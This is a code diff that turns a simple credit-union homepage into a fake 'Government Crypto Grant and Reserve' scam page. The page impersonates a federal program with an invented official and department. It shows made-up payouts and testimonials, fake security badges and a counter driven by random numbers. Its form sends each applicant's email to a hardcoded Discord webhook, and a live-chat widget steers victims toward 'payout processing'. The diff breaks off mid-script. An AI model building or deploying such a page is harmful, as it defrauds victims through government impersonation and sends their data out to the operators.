@@ -1,184 +1,386 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unity Credit Union</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f5f7fa;
-      color: #333;
-    }
-
-    header {
-      background-color: #003366;
-      color: white;
-      padding: 15px 30px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    header img {
-      height: 50px;
-    }
-
-    .login-box {
-      background: white;
-      padding: 10px 20px;
-      border-radius: 6px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-    }
-
-    .login-box input {
-      margin: 5px;
-      padding: 6px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    .login-box button {
-      padding: 6px 12px;
-      background: #0055a5;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    nav {
-      background-color: #0055a5;
-      padding: 10px;
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-    }
-
-    nav a {
-      color: white;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    nav a:hover {
-      text-decoration: underline;
-    }
-
-    .container {
-      max-width: 1200px;
-      margin: 20px auto;
-      padding: 0 15px;
-    }
-
-    .grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-    }
-
-    .card {
-      flex: 1 1 calc(33.333% - 20px);
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      min-width: 250px;
-      cursor: pointer;
-      transition: all 0.2s ease-in-out;
-    }
-
-    .card:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-    }
-
-    .card h2 {
-      margin-top: 0;
-      color: #003366;
-    }
-
-    .btn {
-      display: inline-block;
-      padding: 10px 20px;
-      background: #0055a5;
-      color: white;
-      border-radius: 5px;
-      text-decoration: none;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-
-    .btn:hover {
-      background: #003366;
-    }
-
-    footer {
-      background-color: #003366;
-      color: white;
-      text-align: center;
-      padding: 15px;
-      margin-top: 30px;
-    }
-
-    @media (max-width: 900px) {
-      .card {
-        flex: 1 1 calc(50% - 20px);
-      }
-    }
-
-    @media (max-width: 600px) {
-      .card {
-        flex: 1 1 100%;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Government Crypto Grant and Reserve</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f4f4f4"/><path d="M10 10 L90 50 L10 90 Z" fill="%230073aa" stroke="%23005599" stroke-width="2"/></svg>') repeat;
+            color: #333;
+            background-size: 200px 200px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #0073aa;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .description {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .sidebar {
+            float: left;
+            width: 25%;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
+            border-radius: 5px;
+        }
+        .main-content {
+            float: right;
+            width: 70%;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+            border-radius: 5px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #005d8f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #004d75;
+        }
+        #statusMessage, #quizResult {
+            margin-top: 10px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            display: none;
+        }
+        .status-active {
+            color: green;
+            font-weight: bold;
+        }
+        .payout-section {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #0073aa;
+            color: white;
+            border-radius: 5px;
+        }
+        .recent-payouts {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+        }
+        .payout-item {
+            margin-bottom: 10px;
+            padding: 8px;
+            background-color: white;
+            color: #333;
+            border-radius: 3px;
+            font-style: italic;
+        }
+        .news-ticker {
+            background-color: #005d8f;
+            color: white;
+            padding: 5px;
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .ticker-content {
+            display: inline-block;
+            animation: ticker 15s linear infinite;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .security-badges img {
+            width: 80px;
+            margin: 10px;
+            opacity: 0.8;
+        }
+        .quiz-section {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .live-stats {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #0073aa;
+            color: white;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .testimonials {
+            margin-top: 20px;
+            clear: both;
+        }
+        .testimonial {
+            display: inline-block;
+            width: 30%;
+            margin: 0 1.5% 20px;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .testimonial img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+        .video-testimonial iframe {
+            width: 100%;
+            height: 200px;
+            border: none;
+            border-radius: 5px;
+        }
+        .partner-logos img {
+            width: 100px;
+            margin: 10px;
+            opacity: 0.7;
+        }
+        footer {
+            clear: both;
+            text-align: center;
+            padding: 10px;
+            background-color: #0073aa;
+            color: white;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <img src="logo.png" alt="Unity Credit Union Logo">
-    <div class="login-box">
-      <form>
-        <input type="text" placeholder="Username" required>
-        <input type="password" placeholder="Password" required>
-        <button type="submit">Login</button>
-      </form>
+    <header>
+        <h1>Government Crypto Grant and Reserve</h1>
+        <p>Empowering American Innovation Through Secure Crypto Funding – Established 2025</p>
+    </header>
+    <div class="container">
+        <div class="description">
+            <p>Welcome to the official Government Crypto Grant and Reserve Program. Launched in 2025, this initiative provides eligible citizens with access to cryptocurrency grants to support innovative projects, small businesses, and personal financial growth. Our secure platform ensures fast, transparent payouts via trusted methods. All applications are processed confidentially by federal officials.</p>
+        </div>
+        <div class="sidebar">
+            <h3>Official Account</h3>
+            <p><strong>Name:</strong> Federal Grant Administrator – Dr. Elena Vasquez</p>
+            <p><strong>ID:</strong> GOV-2025-USA-4782</p>
+            <p><strong>Status:</strong> <span class="status-active">Live Green</span></p>
+            <p><strong>Department:</strong> U.S. Department of Innovation and Crypto Reserves</p>
+        </div>
+        <div class="main-content">
+            <h2>Applicant Registration</h2>
+            <form id="applicantForm" onsubmit="generateReferenceCode(event)">
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="referenceId">Reference ID:</label>
+                    <input type="text" id="referenceId" name="referenceId" readonly>
+                </div>
+                <button type="submit">Generate Reference Code</button>
+            </form>
+            <div id="statusMessage"></div>
+            <div class="payout-section">
+                <h3>Recent Payouts</h3>
+                <p>Once approved, your grant will be processed discreetly and securely. See below for examples of recent recipient payouts.</p>
+                <div class="recent-payouts">
+                    <div class="payout-item">Rudy Henderson received $5,000 through PayPal Bitcoin.</div>
+                    <div class="payout-item">James Prowler received $2,500 with Moon Pay.</div>
+                    <div class="payout-item">Stella Stanford received $10,000 via Cash App.</div>
+                    <div class="payout-item">Marcus Lee received $4,000 through Venmo transfer.</div>
+                    <div class="payout-item">Elena Ramirez received $7,500 using Zelle.</div>
+                    <div class="payout-item">Tyler Brooks received $3,000 via Bitcoin wallet.</div>
+                    <div class="payout-item">Sophia Chen received $6,000 through PayPal.</div>
+                    <div class="payout-item">Derek Walsh received $8,000 with Cash App Bitcoin.</div>
+                </div>
+            </div>
+            <div class="news-ticker">
+                <div class="ticker-content">
+                    &nbsp; 2025 Grants Issued to 10,000+ Americans – Apply Now! &nbsp; | &nbsp; Total Funding Exceeds $50M! &nbsp; | &nbsp; New Crypto Reserve Launched Today! &nbsp;
+                </div>
+            </div>
+            <div class="security-badges">
+                <img src="https://via.placeholder.com/80?text=SSL+Secured" alt="SSL Secured">
+                <img src="https://via.placeholder.com/80?text=Verified+by+Norton" alt="Verified by Norton">
+                <img src="https://via.placeholder.com/80?text=Government+Certified" alt="Government Certified">
+            </div>
+            <div class="quiz-section">
+                <h3>Eligibility Quiz</h3>
+                <form id="eligibilityQuiz" onsubmit="checkEligibility(event)">
+                    <div class="form-group">
+                        <label>Are you a U.S. citizen?</label>
+                        <select name="citizen" required>
+                            <option value="">Select</option>
+                            <option value="yes">Yes</option>
+                            <option value="no">No</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Are you over 18?</label>
+                        <select name="age" required>
+                            <option value="">Select</option>
+                            <option value="yes">Yes</option>
+                            <option value="no">No</option>
+                        </select>
+                    </div>
+                    <button type="submit">Check Eligibility</button>
+                </form>
+                <div id="quizResult"></div>
+            </div>
+            <div class="live-stats">
+                <p>Grants Issued: <span id="grantsIssued">5,432</span></p>
+                <p>Total Funded: $<span id="totalFunded">12,000,000</span></p>
+            </div>
+        </div>
     </div>
-  </header>
-
-  <nav>
-    <a href="index.html">Home</a>
-    <a href="checking.html">Checking</a>
-    <a href="loans.html">Loans</a>
-    <a href="contact.html">Contact</a>
-  </nav>
-
-  <div class="container">
-    <div class="grid">
-      <div class="card" onclick="window.location.href='open-checking.html'">
-        <h2>Open a Checking Account</h2>
-        <p>Enjoy easy, convenient banking with our modern checking account options tailored for your lifestyle.</p>
-        <a href="open-checking.html" class="btn">Open Now</a>
-      </div>
-
-      <div class="card" onclick="window.location.href='apply-loan.html'">
-        <h2>Apply for a Loan</h2>
-        <p>Need financial support? Our loan options come with flexible terms and competitive rates.</p>
-        <a href="apply-loan.html" class="btn">Apply Today</a>
-      </div>
-
-      <div class="card" onclick="window.location.href='personal-banking.html'">
-        <h2>Personal Banking</h2>
-        <p>From savings to retirement plans, Unity Credit Union is here to guide your financial journey.</p>
-        <a href="personal-banking.html" class="btn">Learn More</a>
-      </div>
+    <div class="testimonials">
+        <h2 style="text-align: center; clear: both;">Success Stories from 2025 Recipients</h2>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=80&h=80&fit=crop&crop=face" alt="Sarah M.">
+            <p><strong>Sarah M., Entrepreneur</strong><br>"Received my $10,000 BTC grant in under 24 hours! This program changed my startup."</p>
+        </div>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" alt="Mike R.">
+            <p><strong>Mike R., Innovator</strong><br>"PayPal payout was seamless. As a 2025 recipient, I highly recommend this official reserve."</p>
+        </div>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" alt="Lisa T.">
+            <p><strong>Lisa T., Small Business Owner</strong><br>"Cash App transfer arrived instantly. Government Crypto Grant made my dreams reality!"</p>
+        </div>
     </div>
-  </div>
+    <div class="video-testimonial" style="max-width: 1200px; margin: 20px auto; padding: 20px; background-color: rgba(255, 255, 255, 0.9); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+        <h3 style="text-align: center;">Video Testimonial</h3>
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" title="Placeholder Testimonial Video" frameborder="0" allowfullscreen></iframe>
+        <p style="text-align: center; font-style: italic;">Watch John D. share his $15,000 grant success story!</p>
+    </div>
+    <div class="partner-logos" style="max-width: 1200px; margin: 20px auto; text-align: center; padding: 20px; background-color: rgba(255, 255, 255, 0.9); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+        <h3>Trusted Partners</h3>
+        <img src="https://via.placeholder.com/100?text=Bank+USA" alt="Bank USA">
+        <img src="https://via.placeholder.com/100?text=Crypto+Exchange" alt="Crypto Exchange">
+        <img src="https://via.placeholder.com/100?text=Secure+Pay" alt="Secure Pay">
+    </div>
+    <footer>
+        <p>&copy; 2025 U.S. Government Crypto Grant and Reserve. All rights reserved. Secure and Official.</p>
+    </footer>
 
-  <footer>
-    &copy; 2025 Unity Credit Union. All Rights Reserved.
-  </footer>
-</body>
-</html>
+    <!-- Live Chat Widget (Smartsupp) -->
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57'; // your unique key
+        window.smartsupp || (function(d) {
+            var s, c, o = smartsupp = function() { o._.push(arguments); }; o._ = [];
+            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?';
+            s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+
+    <!-- Discord Webhook and Additional Scripts -->
+    <script>
+        function generateReferenceCode(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const referenceId = 'GCR-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            const statusMessage = document.getElementById('statusMessage');
+            const displayRefId = document.getElementById('displayRefId');
+            const statusDisplay = document.getElementById('statusDisplay');
+
+            document.getElementById('referenceId').value = referenceId;
+            displayRefId.textContent = referenceId;
+            statusDisplay.textContent = 'Pending';
+            statusMessage.style.display = 'block';
+            statusMessage.textContent = 'Reference code generated. Contact live chat for approval and payout processing.';
+
+            const data = {
+                content: `🔥 New Registration - Government Crypto Grant:
+                \nEmail: *${email}*
+                \nReference ID: *${referenceId}*`
+            };
+
+            fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(err => {
+                console.error(err);
+            });
+        }
+
+        function checkEligibility(event) {
+            event.preventDefault();
+            const citizen = document.querySelector('select[name="citizen"]').value;
+            const age = document.querySelector('select[name="age"]').value;
+            const quizResult = document.getElementById('quizResult');
+
+            if (citizen === 'yes' && age === 'yes') {
+                quizResult.style.display = 'block';
+                quizResult.style.color = 'green';
+                quizResult.textContent = 'Congratulations! You are pre-qualified. Proceed to generate your reference code.';
+            } else {
+                quizResult.style.display = 'block';
+                quizResult.style.color = 'red';
+                quizResult.textContent = 'Sorry, you do not meet the eligibility criteria at this time.';
+            }
+        }
+
+        // Live Stats Counter
+        let grantsIssued = 5432;
+        let totalFunded = 12000000;
+        setInterval(() => {
+            grantsIssued += Math.floor(Math.random() * 5);
+            totalFunded += Math.floor(Math.random() * 10000);
+            document.getElementById('grantsIssued').textContent = grantsIssued;
+            document.getElementById('totalFunded').textContent = totalFunded.toLocaleString();
+        }, 2000);
+
+        // Manual status update via live chat (simulated for lab)
+        function updateStatus(refId, status) {
+            if (document.getElementById('displayRefId').textContent === refId) {
+                document.getElementById('statusDisplay').textContent = status;
+                document.getElementById('statusMessage').textContent = `Status updated to ${status}. Payout ready via selected method
